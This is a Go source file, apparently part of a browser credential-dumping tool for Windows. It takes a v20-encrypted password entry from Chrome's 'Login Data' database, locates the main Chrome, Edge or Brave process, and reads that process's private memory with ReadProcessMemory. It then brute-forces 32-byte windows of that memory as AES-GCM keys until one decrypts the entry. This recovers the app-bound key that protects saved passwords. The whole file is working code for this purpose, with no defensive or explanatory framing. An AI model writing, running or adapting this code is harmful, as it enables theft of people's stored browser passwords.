//go:build decrypt && windows

package decrypt

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")

	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = kernel32.NewProc("Process32FirstW")
	procProcess32Next            = kernel32.NewProc("Process32NextW")
	procVirtualQueryEx           = kernel32.NewProc("VirtualQueryEx")
	procReadProcessMemory        = kernel32.NewProc("ReadProcessMemory")
)

const (
	th32csSnapProcess    = 0x00000002
	memCommit            = 0x00001000
	memPrivate           = 0x00020000
	pageReadonly         = 0x00000002
	pageReadWrite        = 0x00000004
	pageExecuteRead      = 0x00000020
	pageExecuteReadWrite = 0x00000040
	pageWriteCopy        = 0x00000008

	maxRegionSize   = 32 * 1024 * 1024  // skip regions > 32 MB
	maxTotalScanned = 256 * 1024 * 1024 // stop after 256 MB per process
	memScanTimeout  = 45 * time.Second  // hard wall-clock limit
)

type processEntry32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

type memoryBasicInformation struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
}

// chromeProcess holds a process entry with its resolved name.
type chromeProcess struct {
	pid       uint32
	parentPID uint32
	name      string
}

// ScanChromeProcessMemory finds the main browser process for the given browser,
// reads its MEM_PRIVATE+MEM_COMMIT heap pages, and searches for the 32-byte
// AES-256 v20 key using a GCM validation oracle.
func ScanChromeProcessMemory(profileDir, browserName string) ([]byte, error) {
	blob, err := getFirstV20Blob(profileDir)
	if err != nil {
		return nil, fmt.Errorf("no v20 blob for validation: %w", err)
	}

	exeName := browserExeName(browserName)
	procs, err := enumerateProcesses()
	if err != nil {
		return nil, err
	}

	// Collect all PIDs for this browser.
	var browserPIDs []chromeProcess
	pidSet := map[uint32]bool{}
	for _, p := range procs {
		if equalFold(p.name, exeName) {
			browserPIDs = append(browserPIDs, p)
			pidSet[p.pid] = true
		}
	}
	if len(browserPIDs) == 0 {
		return nil, fmt.Errorf("%s not running", exeName)
	}

	// The main browser process is the one whose parent is NOT another
	// instance of the same browser (i.e. it was launched by the user/OS,
	// not spawned by Chrome itself). Try it first.
	var ordered []chromeProcess
	for _, p := range browserPIDs {
		if !pidSet[p.parentPID] {
			ordered = append([]chromeProcess{p}, ordered...)
		} else {
			ordered = append(ordered, p)
		}
	}

	fmt.Fprintf(os.Stderr, "[*] Scanning %d %s process(es) for v20 key...\n", len(ordered), exeName)

	ctx, cancel := context.WithTimeout(context.Background(), memScanTimeout)
	defer cancel()

	for i, p := range ordered {
		select {
		case <-ctx.Done():
			return nil, fmt.Errorf("memory scan timed out after %s", memScanTimeout)
		default:
		}
		fmt.Fprintf(os.Stderr, "[*] Scanning PID %d (%d/%d)...\n", p.pid, i+1, len(ordered))
		key, err := scanProcessMemoryForKey(ctx, p.pid, blob)
		if err == nil && key != nil {
			fmt.Fprintf(os.Stderr, "[+] v20 key found in PID %d\n", p.pid)
			return key, nil
		}
	}
	return nil, fmt.Errorf("v20 key not found in %s memory", exeName)
}

func browserExeName(browserName string) string {
	switch {
	case equalFold(browserName, "Edge") || equalFold(browserName, "msedge"):
		return "msedge.exe"
	case equalFold(browserName, "Brave"):
		return "brave.exe"
	default:
		return "chrome.exe"
	}
}

// enumerateProcesses returns all running processes via CreateToolhelp32Snapshot.
func enumerateProcesses() ([]chromeProcess, error) {
	snap, _, err := procCreateToolhelp32Snapshot.Call(th32csSnapProcess, 0)
	if snap == uintptr(syscall.InvalidHandle) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(windows.Handle(snap))

	var entry processEntry32
	entry.dwSize = uint32(unsafe.Sizeof(entry))
	ret, _, _ := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return nil, fmt.Errorf("Process32First: empty snapshot")
	}

	var out []chromeProcess
	for {
		out = append(out, chromeProcess{
			pid:       entry.th32ProcessID,
			parentPID: entry.th32ParentProcessID,
			name:      syscall.UTF16ToString(entry.szExeFile[:]),
		})
		entry.dwSize = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	return out, nil
}

func equalFold(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		ca, cb := a[i], b[i]
		if ca >= 'A' && ca <= 'Z' {
			ca += 'a' - 'A'
		}
		if cb >= 'A' && cb <= 'Z' {
			cb += 'a' - 'A'
		}
		if ca != cb {
			return false
		}
	}
	return true
}

// getFirstV20Blob returns the first v20-prefixed encrypted_value from Login Data.
func getFirstV20Blob(profileDir string) ([]byte, error) {
	db, cleanup, err := openSQLiteCopy(profileDir + "/Login Data")
	if err != nil {
		return nil, err
	}
	defer cleanup()

	rows, err := db.Query(`SELECT password_value FROM logins LIMIT 50`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var enc []byte
		if err := rows.Scan(&enc); err != nil {
			continue
		}
		if len(enc) > 3 && string(enc[:3]) == "v20" {
			return enc, nil
		}
	}
	return nil, fmt.Errorf("no v20-encrypted entries in Login Data")
}

// scanProcessMemoryForKey walks MEM_PRIVATE+MEM_COMMIT pages and searches for
// the 32-byte AES key. Respects ctx for cancellation/timeout.
func scanProcessMemoryForKey(ctx context.Context, pid uint32, blob []byte) ([]byte, error) {
	handle, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false, pid,
	)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(handle)

	var totalScanned int64
	var addr uintptr
	buf := make([]byte, 4*1024*1024) // 4 MB read buffer

	for {
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		default:
		}

		var mbi memoryBasicInformation
		ret, _, _ := procVirtualQueryEx.Call(
			uintptr(handle),
			addr,
			uintptr(unsafe.Pointer(&mbi)),
			unsafe.Sizeof(mbi),
		)
		if ret == 0 {
			break
		}

		next := mbi.BaseAddress + mbi.RegionSize

		if mbi.State == memCommit &&
			mbi.Type == memPrivate &&
			isReadable(mbi.Protect) &&
			mbi.RegionSize <= maxRegionSize {

			size := int(mbi.RegionSize)
			if size > len(buf) {
				size = len(buf)
			}
			chunk := buf[:size]

			var nRead uintptr
			ret, _, _ := procReadProcessMemory.Call(
				uintptr(handle),
				mbi.BaseAddress,
				uintptr(unsafe.Pointer(&chunk[0])),
				uintptr(size),
				uintptr(unsafe.Pointer(&nRead)),
			)
			if ret != 0 && nRead >= 32 {
				if key := searchForKey(chunk[:nRead], blob); key != nil {
					return key, nil
				}
			}
			totalScanned += int64(nRead)
			if totalScanned > maxTotalScanned {
				break
			}
		}

		if next <= addr {
			break
		}
		addr = next
	}
	return nil, fmt.Errorf("key not found in PID %d", pid)
}

func isReadable(protect uint32) bool {
	p := protect & 0xFF
	switch p {
	case pageReadonly, pageReadWrite, pageExecuteRead, pageExecuteReadWrite, pageWriteCopy:
		return true
	}
	return false
}

func searchForKey(data, blob []byte) []byte {
	if len(data) < 32 || len(blob) < 3+12+16 {
		return nil
	}
	for i := 0; i <= len(data)-32; i++ {
		candidate := data[i : i+32]
		if !hasMinEntropy(candidate) {
			continue
		}
		if validateChromeKey(candidate, blob) {
			out := make([]byte, 32)
			copy(out, candidate)
			return out
		}
	}
	return nil
}

func hasMinEntropy(b []byte) bool {
	var seen [256]bool
	unique := 0
	for _, v := range b {
		if !seen[v] {
			seen[v] = true
			unique++
		}
	}
	return unique >= 16
}

func validateChromeKey(key, blob []byte) bool {
	if string(blob[:3]) != "v20" {
		return false
	}
	raw := blob[3:]
	if len(raw) < 12+16 {
		return false
	}
	nonce := raw[:12]
	ct := raw[12:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return false
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return false
	}
	pt, err := gcm.Open(nil, nonce, ct, nil)
	return err == nil && len(pt) > 32
}
